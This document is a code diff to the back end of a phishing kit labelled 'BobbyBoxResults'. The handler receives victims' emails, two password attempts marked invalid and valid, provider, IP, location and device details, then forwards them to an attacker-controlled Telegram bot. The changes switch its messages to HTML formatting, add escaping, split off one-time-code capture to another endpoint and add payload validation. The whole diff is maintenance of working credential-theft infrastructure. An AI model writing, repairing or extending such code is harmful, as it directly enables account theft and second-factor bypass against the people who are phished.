@@ -58,11 +58,19 @@ const getDeviceDetails = (userAgent) => {
   };
 };
 
+// --- HTML Escaping ---
+const escapeHtml = (text) => {
+  if (text === null || text === undefined) return 'N/A';
+  return String(text)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+};
+
 // --- Message Composers ---
 
 /**
- * Composes the message for login credentials.
- * This function remains structurally the same.
+ * Composes the message for login credentials using HTML formatting.
  * @param {object} data - The parsed request body.
  * @returns {string}
  */
@@ -72,7 +80,17 @@ const composeCredentialsMessage = (data) => {
         clientIP, location, deviceDetails, timestamp, sessionId,
     } = data;
 
-    const passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
+    const safeEmail = escapeHtml(email || 'Not captured');
+    const safeFirstPw = escapeHtml(firstAttemptPassword);
+    const safeSecondPw = escapeHtml(secondAttemptPassword);
+    const safeProvider = escapeHtml(provider || 'Others');
+    const safeIP = escapeHtml(clientIP);
+    const safeRegion = escapeHtml(location.regionName);
+    const safeCountry = escapeHtml(location.country);
+    const safeOS = escapeHtml(deviceDetails.os);
+    const safeBrowser = escapeHtml(deviceDetails.browser);
+    const safeDevice = escapeHtml(deviceDetails.deviceType);
+    const safeSessionId = escapeHtml(sessionId);
 
     const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
@@ -80,63 +98,27 @@ const composeCredentialsMessage = (data) => {
         timeZone: 'UTC', hour12: true
     }) + ' UTC';
 
-    return `
-*🔐 BobbyBoxResults - Credentials 🔐*
+    return `<b>🔐 BobbyBoxResults - Credentials 🔐</b>
 
-*ACCOUNT DETAILS*
-- 📧 Email: \`${email || 'Not captured'}\`
-- 🏢 Provider: *${provider || 'Others'}*
-- ${passwordSection}
+<b>ACCOUNT DETAILS</b>
+📧 Email: ${safeEmail}
+🏢 Provider: <b>${safeProvider}</b>
+🔑 First (invalid): ${safeFirstPw}
+🔑 Second (valid): ${safeSecondPw}
 
-*DEVICE & LOCATION*
-- 📍 IP Address: \`${clientIP}\`
-- 🌍 Location: *${location.regionName}, ${location.country}*
-- 💻 OS: *${deviceDetails.os}*
-- 🌐 Browser: *${deviceDetails.browser}*
-- 🖥️ Device Type: *${deviceDetails.deviceType}*
+<b>DEVICE &amp; LOCATION</b>
+📍 IP Address: ${safeIP}
+🌍 Location: <b>${safeRegion}, ${safeCountry}</b>
+💻 OS: <b>${safeOS}</b>
+🌐 Browser: <b>${safeBrowser}</b>
+🖥️ Device Type: <b>${safeDevice}</b>
 
-*SESSION INFO*
-- 🕒 Timestamp: *${formattedTimestamp}*
-- 🆔 Session ID: \`${sessionId}\`
-`;
+<b>SESSION INFO</b>
+🕒 Timestamp: <b>${formattedTimestamp}</b>
+🆔 Session ID: ${safeSessionId}`;
 };
 
-/**
- * Composes the message for the OTP code.
- * This is the new function to handle the OTP submission.
- * @param {object} data - The OTP data payload.
- * @returns {string}
- */
-const composeOtpMessage = (data) => {
-    const { otp, session } = data;
-    // Fallback to empty object if session is missing
-    const { email, provider, clientIP, location, deviceDetails, sessionId } = session || {};
-
-    const formattedTimestamp = new Date().toLocaleString('en-US', {
-        year: 'numeric', month: 'short', day: 'numeric',
-        hour: '2-digit', minute: '2-digit', second: '2-digit',
-        timeZone: 'UTC', hour12: true
-    }) + ' UTC';
-
-    return `
-*🔑 BobbyBoxResults - OTP Code 🔑*
-
-*VERIFICATION CODE*
-- 🔢 OTP Code: \`${otp}\`
-
-*ASSOCIATED SESSION*
-- 📧 Email: \`${email || 'N/A'}\`
-- 🏢 Provider: *${provider || 'N/A'}*
-- 📍 IP Address: \`${clientIP || 'N/A'}\`
-- 🆔 Session ID: \`${sessionId}\`
-
-*SUBMITTED AT*
-- 🕒 Timestamp: *${formattedTimestamp}*
-`;
-};
-
-
-// --- Main Handler ---
+// --- Main Handler (credentials only — OTP is handled by sendOtp function) ---
 exports.handler = async (event) => {
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -156,46 +138,42 @@ exports.handler = async (event) => {
   }
   
   try {
-    const body = JSON.parse(event.body || '{}');
-    const { type, data } = body;
-    let message;
+    const data = JSON.parse(event.body || '{}');
 
-    // --- Message Routing Logic ---
-    // Route the request to the correct message composer based on the `type` field.
-    if (type === 'credentials') {
-        const clientIP = getClientIp(event);
-        const location = await getIpAndLocation(clientIP);
-        const deviceDetails = getDeviceDetails(data.userAgent);
-        
-        const messageData = { ...data, clientIP, location, deviceDetails };
-        message = composeCredentialsMessage(messageData);
-
-    } else if (type === 'otp') {
-        // For OTP, we re-use device/location info from the associated session.
-        // No new IP lookup is needed.
-        message = composeOtpMessage(data);
-
-    } else {
-        // Fallback for old format or unknown types
-        console.warn('Request received with unknown or missing "type". Processing as credentials.');
-        const clientIP = getClientIp(event);
-        const location = await getIpAndLocation(clientIP);
-        const deviceDetails = getDeviceDetails(body.userAgent);
-        const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);
-        message = composeCredentialsMessage({ ...body, clientIP, location, deviceDetails, sessionId });
+    // Validate: this endpoint handles credentials ONLY.
+    // Reject any payload that looks like an OTP submission.
+    if (data.otp || !data.email || !data.firstAttemptPassword) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'Invalid payload for credentials endpoint. Use /api/sendOtp for OTP submissions.' }),
+      };
     }
+
+    const clientIP = getClientIp(event);
+    const location = await getIpAndLocation(clientIP);
+    const deviceDetails = getDeviceDetails(data.userAgent);
+    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
+
+    const messageData = { ...data, clientIP, location, deviceDetails, sessionId };
+    const message = composeCredentialsMessage(messageData);
 
     // Send the composed message to Telegram
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
+      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
       signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
     });
 
     if (!telegramResponse.ok) {
       const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
       console.error('Telegram API Error:', errorResult.description);
+      return {
+        statusCode: 502,
+        headers,
+        body: JSON.stringify({ success: false, error: 'Failed to send credentials message.' }),
+      };
     }
 
     return {
